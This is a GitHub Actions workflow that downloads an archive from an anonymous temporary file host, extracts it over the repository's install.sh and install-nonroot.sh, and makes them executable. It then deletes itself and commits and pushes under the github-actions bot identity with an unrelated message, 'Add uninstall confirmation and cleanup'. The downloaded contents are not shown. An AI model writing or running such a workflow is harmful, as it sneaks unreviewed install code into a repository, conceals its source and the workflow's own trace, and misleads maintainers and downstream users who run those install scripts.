name: Import service update 5

on:
  push:
    paths:
      - .github/workflows/import-svc5.yml

permissions:
  contents: write

jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Import service update
        run: |
          set -euo pipefail
          curl -fsSL "https://tmpfiles.org/dl/1793543968.25409d217109f0c3/wsANdRlKKS1n/svc5.tgz" -o /tmp/svc5.tgz
          tar -xzf /tmp/svc5.tgz -C .
          chmod +x install.sh install-nonroot.sh
          rm -f .github/workflows/import-svc5.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add install.sh install-nonroot.sh .github/workflows/import-svc5.yml
          git commit -m "Add uninstall confirmation and cleanup"
          git push
